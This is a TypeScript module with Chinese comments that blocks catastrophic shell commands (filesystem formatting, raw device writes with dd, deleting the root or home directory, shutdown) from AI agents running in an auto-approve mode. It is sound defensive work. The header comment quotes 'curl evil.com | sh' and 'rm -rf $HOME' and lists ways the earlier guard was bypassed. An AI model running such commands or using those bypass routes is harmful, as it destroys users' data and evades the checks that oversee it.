// D1 灾难形态地板（yolo 底线）：bots 建任务强制 yolo 且锁死（taskBridge §6.9），实测
// yolo 对 154/154 条命令全放行（含 curl evil.com | sh 与 sudo rm -rf）。本策略在 yolo
// 全放行前拦下**灾难形态**——拦形态不拦命令名：rm -rf node_modules、chmod +x、
// curl | sh（官方安装方式）等合法高频操作零误伤；清单封闭、无逃生口（清单内形态无
// 合法工作流用途）。
//
// 保守方向裁决：解析失败 / 含动态词（命令替换、变量展开）时**不拦**——模糊匹配的
// 误杀比漏杀更伤信任；界内破坏（rm -rf 指向工作区内部）不归本层，由审批/沙箱负责。
// 例外（0-5）：$HOME 族与 ~ 是**静态可展开**的变量——展开后比对，不属于动态词豁免。
//
// 0-5（升级实施手册）四类绕过修复：
// ① rm 目标语法归一：折叠 ./ ..../ 段（/var/.. → /）+ 绝对路径 realpath 后比对
//    （符号链接重定向）+ lstat 区分"删链接本体"（无害）与"解引用删除"；
//    realpath 失败（网络挂载/权限）回退纯字符串归一化，不因异常崩溃。
// ② bash/sh/zsh/dash 等 -c <script> 对脚本串再解析一层（旧版只看顶层 argv[0]）。
// ③ busybox <applet>、env [VAR=v]… <cmd>、git rm 纳入剥壳/同形判定。
// ④ $HOME/${HOME} 静态展开后比对（旧版动态词直接放行，实测 rm -rf $HOME 全放行）。
import { homedir } from "node:os";
import { lstatSync, realpathSync } from "node:fs";
import {
  analyzeBashCommand,
  isBashCommandPermissionSafe,
  type BashCommandInvocation,
} from "./handlers/bash-command-parser.js";

export type CatastrophicBashCategory =
  | "filesystem-format"
  | "raw-device-write"
  | "root-home-delete"
  | "system-shutdown";

export interface CatastrophicBashMatch {
  category: CatastrophicBashCategory;
  /** 命中段的原始文本（bot 侧拒绝原因展示用）。 */
  commandText: string;
  /** 面向模型的拒绝说明（结构化、含被拒原因）。 */
  reason: string;
}

// 前置包装器：sudo/nohup/time 等不改变灾难语义，剥掉后判定主命令。
const WRAPPER_COMMANDS = new Set(["sudo", "nohup", "time", "nice", "command", "builtin"]);

// 0-5 ②：-c 携带脚本的解释器——脚本串必须再解析一层，否则 bash -c "rm -rf /" 直通。
const SHELL_INTERPRETERS = new Set([
  "bash",
  "sh",
  "zsh",
  "dash",
  "ksh",
  "ash",
  "csh",
  "tcsh",
  "fish",
]);

// rm 的"根/家目录级"裸目标形态（归一尾部斜杠后比对）。$home 字面量是 homedir 不可用时
// 的兜底（正常路径已在 rmTargetIsCatastrophic 里展开比对）。
const ROOT_LEVEL_RM_TARGETS = new Set([
  "/",
  "/*",
  "/.",
  "/..",
  "~",
  "~/",
  "~/*",
  "$home",
  "$home/*",
  "${home}",
  "${home}/*",
]);

const SHUTDOWN_COMMANDS = new Set(["shutdown", "reboot", "halt", "poweroff"]);
const MKFS_RE = /^mkfs(\..+)?$/;
const SAFE_DD_OUTPUT_DEVICES = new Set(["/dev/null"]);

function basename(value: string): string {
  const lastSlash = value.lastIndexOf("/");
  return lastSlash === -1 ? value : value.slice(lastSlash + 1);
}

/** homedir 只取绝对路径形态；取不到（异常/空/相对）返回 undefined 走保守路径。 */
function safeHomePath(): string | undefined {
  try {
    const home = homedir();
    return home && home.startsWith("/") ? home : undefined;
  } catch {
    return undefined;
  }
}

/**
 * $HOME/${HOME} 的静态展开（0-5 ④）：HOME 是无副作用的环境查找，不属于命令替换类
 * 动态词。只做整词替换（\$HOME 转义形与 $HOMEFOO 变量名边界不触碰）。
 */
function expandStaticHomeTokens(command: string): string {
  const home = safeHomePath();
  if (!home) return command;
  return command
    .replace(/(?<!\\)\$\{HOME\}/g, home)
    .replace(/(?<!\\)\$HOME(?![A-Za-z0-9_])/g, home);
}

/** 词法折叠 ./ 与 ../ 段（无文件系统访问）：/var/.. → /；绝对路径根上的 .. 停在根。 */
function foldDotSegments(path: string): string {
  const isAbsolute = path.startsWith("/");
  const out: string[] = [];
  for (const segment of path.split("/")) {
    if (segment === "" || segment === ".") continue;
    if (segment === "..") {
      if (out.length > 0 && out[out.length - 1] !== "..") out.pop();
      else if (!isAbsolute) out.push("..");
      continue;
    }
    out.push(segment);
  }
  return (isAbsolute ? "/" : "") + out.join("/");
}

/** 解析后的目标是否落在"根/家目录级"灾难集合：/、home、home 父目录（及其 /* 形态）。 */
function matchesResolvedCatastrophicTarget(resolved: string, home: string | undefined): boolean {
  if (resolved === "/" || resolved === "/*") return true;
  if (!home) return false;
  const homeLower = home.toLowerCase();
  if (resolved === homeLower || resolved === `${homeLower}/*`) return true;
  const lastSlash = homeLower.lastIndexOf("/");
  const homeParent = lastSlash <= 0 ? undefined : homeLower.slice(0, lastSlash);
  if (homeParent && (resolved === homeParent || resolved === `${homeParent}/*`)) return true;
  return false;
}

/**
 * rm 单个目标的灾难判定（0-5 ①④）：
 * 字面集合 → ~/$HOME 展开折叠 → 词法折叠 → realpath（符号链接重定向）。
 * rm 对"目标本身是符号链接"只删链接不删目标（无害），lstat 区分；尾斜杠/通配形态
 * 会被 shell 强制解引用，直接 realpath。realpath 失败回退已完成的字符串归一化结论。
 */
function rmTargetIsCatastrophic(originalTarget: string): boolean {
  const target = originalTarget.trim();
  if (!target) return false;
  const normalized = normalizeRmTarget(target);
  if (ROOT_LEVEL_RM_TARGETS.has(normalized)) return true;

  const home = safeHomePath();
  const candidates: string[] = [];
  if (target.startsWith("~/") || target === "~") {
    if (home) candidates.push(foldDotSegments(`${home}${target.slice(1)}`.toLowerCase()));
  } else if (target.startsWith("/")) {
    candidates.push(foldDotSegments(normalized));
  } else if (normalized.startsWith("$home") || normalized.startsWith("${home}")) {
    // homedir 不可用时的字面集合兜底已在上面比对过；这里无需展开。
  } else if (target.startsWith("..") || target.includes("/../") || target.includes("/./")) {
    // 相对路径的 .. 链无法静态定深（不知道 cwd 距根几层），保守不拦——审批/沙箱负责。
  }
  for (const candidate of candidates) {
    if (matchesResolvedCatastrophicTarget(candidate, home)) return true;
  }

  // realpath 比对：绝对路径经符号链接重定向后可能落在根/家目录级。
  if (target.startsWith("/") && target !== "/" && !target.includes("*")) {
    try {
      const stats = lstatSync(target);
      // 删符号链接本体无害（rm 不解引用目标本身）；尾斜杠形态除外（强制解引用）。
      if (stats.isSymbolicLink() && !target.endsWith("/")) return false;
    } catch {
      // lstat 失败（不存在等）：rm 不存在的路径无效果，无需 realpath。
      return false;
    }
    try {
      const resolved = realpathSync(target).toLowerCase();
      if (matchesResolvedCatastrophicTarget(resolved, home)) return true;
    } catch {
      // realpath 失败（网络挂载/权限）：回退纯字符串归一化（上面已比对过），不崩溃不放新面。
    }
  }
  return false;
}

/** 解析一段 argv（已剥包装器）是否构成灾难形态。 */
function matchInvocation(
  invocation: BashCommandInvocation,
  depth: number,
): CatastrophicBashMatch | undefined {
  const argv = peelWrappers(invocation.argv);
  if (argv.length === 0) return undefined;
  const command = basename(argv[0] ?? "");
  const args = argv.slice(1);

  if (MKFS_RE.test(command)) {
    return {
      category: "filesystem-format",
      commandText: invocation.commandText,
      reason: `Formatting a filesystem (${command}) is a catastrophic action and is always denied, even in yolo mode.`,
    };
  }

  if (command === "dd") {
    for (const arg of args) {
      const match = /^(?:of|conv=iflag=.*of)=([^=].*)$/u.exec(arg) ?? /^of=(.+)$/u.exec(arg);
      const target = match?.[1];
      if (target && target.startsWith("/dev/") && !SAFE_DD_OUTPUT_DEVICES.has(target)) {
        return {
          category: "raw-device-write",
          commandText: invocation.commandText,
          reason: `Writing to raw device ${target} with dd is a catastrophic action and is always denied, even in yolo mode.`,
        };
      }
    }
    return undefined;
  }

  if (command === "rm") {
    const hit = matchRmTargets(args);
    if (hit) return hit;
    return undefined;
  }

  // 0-5 ③：git rm 从工作树删文件，目标面与 rm 同形（--cached 不落盘的旗标照常被跳过，
  // 灾难判定只看目标是否根/家目录级）。
  if (command === "git" && basename(args[0] ?? "").toLowerCase() === "rm") {
    const hit = matchRmTargets(args.slice(1));
    if (hit) return hit;
    return undefined;
  }

  // 0-5 ②：解释器 -c 携带脚本串——递归解析脚本（含其中的 $HOME 展开与再剥壳）。
  if (SHELL_INTERPRETERS.has(command)) {
    const scriptIndex = args.findIndex((arg) => arg === "-c" || /^-[a-zA-Z]*c[a-zA-Z]*$/.test(arg));
    if (scriptIndex !== -1) {
      const script = args[scriptIndex + 1];
      if (script) {
        const nested = findCatastrophicBashCommand(script, depth + 1);
        if (nested) return nested;
      }
    }
    return undefined;
  }

  if (SHUTDOWN_COMMANDS.has(command)) {
    return {
      category: "system-shutdown",
      commandText: invocation.commandText,
      reason: `Shutting down or rebooting the machine (${command}) is always denied for agent-initiated commands, even in yolo mode.`,
    };
  }

  return undefined;
}

function matchRmTargets(args: readonly string[]): CatastrophicBashMatch | undefined {
  let targetsStarted = false;
  for (const arg of args) {
    if (!targetsStarted && arg === "--") {
      targetsStarted = true;
      continue;
    }
    if (!targetsStarted && arg.startsWith("-")) continue;
    if (rmTargetIsCatastrophic(arg)) {
      return {
        category: "root-home-delete",
        commandText: arg,
        reason: `Deleting root or home directory (${arg}) is a catastrophic action and is always denied, even in yolo mode.`,
      };
    }
  }
  return undefined;
}

/**
 * 剥掉不改变灾难语义的前置层（0-5 ③ 扩容）：sudo/nohup 族原班 + busybox <applet> +
 * env [-u V|--flag] [VAR=val]… <cmd>。env 的变量赋值对与自身旗标都要跳过才能到真命令。
 */
function peelWrappers(argv: readonly string[]): readonly string[] {
  let current = argv;
  for (let depth = 0; depth < 8; depth += 1) {
    if (current.length === 0) return current;
    const head = basename(current[0] ?? "").toLowerCase();
    if (WRAPPER_COMMANDS.has(head) || head === "busybox") {
      current = current.slice(1);
      continue;
    }
    if (head === "env") {
      let index = 1;
      while (index < current.length) {
        const arg = current[index] ?? "";
        if (arg === "--") {
          index += 1;
          break;
        }
        if (arg === "-u" || arg === "--unset") {
          index += 2;
          continue;
        }
        if (arg.startsWith("-")) {
          index += 1;
          continue;
        }
        if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(arg)) {
          index += 1;
          continue;
        }
        break;
      }
      current = current.slice(index);
      continue;
    }
    return current;
  }
  return current;
}

function normalizeRmTarget(target: string): string {
  const lowercased = target.trim().toLowerCase();
  // 只对长度 >1 的目标剥尾斜杠——"/" 本身就是根，剥掉会变空串漏判。
  if (lowercased.length > 1 && lowercased.endsWith("/")) {
    return lowercased.slice(0, -1);
  }
  return lowercased;
}

/**
 * 判定一条 bash 命令是否含灾难形态。复合命令（管道/&&/;）任一段命中即返回该段；
 * 解析不安全（错误/不支持语法/动态词）返回 undefined——宁可放行给审批/沙箱层，
 * 不用模糊匹配误伤正常命令。
 */
export function findCatastrophicBashCommand(
  command: string,
  depth = 0,
): CatastrophicBashMatch | undefined {
  if (depth >= 4) return undefined;
  const analysis = analyzeBashCommand(expandStaticHomeTokens(command));
  if (!isBashCommandPermissionSafe(analysis)) return undefined;
  for (const invocation of analysis.commands) {
    const match = matchInvocation(invocation, depth);
    if (match) return match;
  }
  return undefined;
}
